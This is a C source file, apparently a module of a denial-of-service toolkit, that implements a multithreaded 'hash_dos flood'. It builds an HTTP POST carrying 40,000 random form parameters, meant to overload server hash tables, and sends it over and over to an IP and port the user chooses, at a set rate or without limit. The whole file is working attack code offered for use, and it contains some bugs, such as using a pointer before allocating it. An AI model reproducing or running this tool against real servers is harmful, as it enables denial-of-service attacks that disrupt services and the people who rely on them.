#include "../header.h"
#include "../base/make_ipv4.h"
#include "../ddos/hash_dos.h"

unsigned int hash_dos_total;
unsigned int hash_dos_produced;

unsigned int hash_dos_per_second;
unsigned int hash_dos_duration;
double hash_dos_elapsed_time;
char *hash_dos_dest_ip;
char *hash_dos_src_ip;
int hash_dos_dest_port;
short hash_dos_timed_finisher;

pthread_mutex_t hash_dos_mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_cond_t hash_dos_cond;

int hash_dos_generated_count;

clock_t hash_dos_global_time;
clock_t hash_dos_global_elapsed_time;

char hash_dos_content[800001];
char hash_dos_randoms[10];
char hash_dos_method[800300];

void hash_dos_print_usage(int mode) {
	if (mode == 1)
		printf(
				"hash_dos flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] \n");
	if (mode == 2)
		printf(
				"hash_dos flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [hash_dos_duration (0 for INF)] [Dest-Port]\n");
}

void* generate_hash_dos_request1(void *data) {
	int thread_id = *((int*) data);

	while (1) {



		pthread_mutex_lock(&hash_dos_mutex);

		if (hash_dos_produced >= hash_dos_total) {
			pthread_mutex_unlock(&hash_dos_mutex);
			pthread_cond_broadcast(&hash_dos_cond);
			return 0;
		}

		int sock;
		if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(hash_dos_dest_port);
		addr.sin_addr.s_addr = inet_addr(hash_dos_dest_ip);

		if (connect(sock, (struct sockaddr*) &addr, sizeof(addr)) < 0) {
			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		close(sock);

		hash_dos_generated_count++;
		hash_dos_produced++;

		pthread_mutex_unlock(&hash_dos_mutex);

	}
}
void* generate_hash_dos_request2(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	while (1) {

		pthread_mutex_lock(&hash_dos_mutex);

		thread_clock = clock();
		hash_dos_elapsed_time = ((double) (thread_clock
				- hash_dos_global_elapsed_time)) / CLOCKS_PER_SEC;

		if (hash_dos_elapsed_time >= hash_dos_duration) {
			pthread_mutex_unlock(&hash_dos_mutex);
			pthread_cond_broadcast(&hash_dos_cond);
			hash_dos_timed_finisher = 1;
			return 0;
		}

		if (hash_dos_produced == hash_dos_per_second) {
			pthread_cond_wait(&hash_dos_cond, &hash_dos_mutex);
		}
		int sock;
		if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(hash_dos_dest_port);
		addr.sin_addr.s_addr = inet_addr(hash_dos_dest_ip);


		if (connect(sock, (struct sockaddr*) &addr, sizeof(addr)) < 0) {
			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		close(sock);

		pthread_mutex_unlock(&hash_dos_mutex);
	}
	return 0;
}

void* hash_dos_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1;
	t1 = clock();
	hash_dos_global_elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&hash_dos_mutex);

		hash_dos_global_time = clock();
		hash_dos_elapsed_time = ((double) (hash_dos_global_time
				- hash_dos_elapsed_time)) / CLOCKS_PER_SEC;

		if (hash_dos_timed_finisher == 1)
			return 0;
		time_taken = ((double) (hash_dos_global_time - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			hash_dos_produced = 0;
			t1 = clock();
			time_taken = 0;

			pthread_cond_signal(&hash_dos_cond);
		}

		pthread_mutex_unlock(&hash_dos_mutex);
	}
}

void hash_dos_run(char *argv[], int mode) {

	srand(time(NULL));
	char arg[21] = "arrrarrarrarrAaAa=1&";
	for (int i = 0; i < 40000; i++) {
		arg[13] = rand() % 26 + 'A';
		arg[14] = rand() % 26 + 'a';
		arg[15] = rand() % 26 + 'A';
		arg[16] = rand() % 26 + 'a';
		strcat(hash_dos_content, arg);
	}
	sprintf(hash_dos_method,
			"POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.22.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n",
			hash_dos_src_ip, (int) sizeof(hash_dos_content));

	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n", hash_dos_content);


	hash_dos_src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;
	hash_dos_generated_count = 0;
	hash_dos_timed_finisher = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 5) {
		hash_dos_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 6) {
		hash_dos_print_usage(mode);
		return;
	}

	strcpy(hash_dos_src_ip, argv[0]);

	hash_dos_produced = 0;
	if (mode == 1) {
		hash_dos_total = atoi(argv[3]);
		hash_dos_dest_port = atoi(argv[4]);
		if (hash_dos_total == 0)
			hash_dos_total = __UINT_MAXIMUM__;
	}

	if (mode == 2) {
		hash_dos_total = 0;
		hash_dos_per_second = atoi(argv[3]);
		hash_dos_duration = atoi(argv[4]);

		if (hash_dos_per_second == 0)
			hash_dos_per_second = __UINT_MAXIMUM__;

		if (hash_dos_duration == 0)
			hash_dos_duration = __UINT_MAXIMUM__;

		hash_dos_dest_port = atoi(argv[5]);
	}

	printf("Maximum = %ld\n", __UINT_MAXIMUM__);

	int num_threads = atoi(argv[2]);

	hash_dos_dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Sending hash_dos requests to %s using %d threads\n",
			hash_dos_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL,
					generate_hash_dos_request1, (void*) &generate_thread_id[i]);
		if (mode == 2)
			pthread_create(&generate_thread[i], NULL,
					generate_hash_dos_request2, (void*) &generate_thread_id[i]);
	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, hash_dos_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		printf("called\n");
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("hash_dos flood Finished\nTotal %d packets sent.\n",
			hash_dos_generated_count);

	pthread_mutex_destroy(&hash_dos_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(hash_dos_src_ip);

}

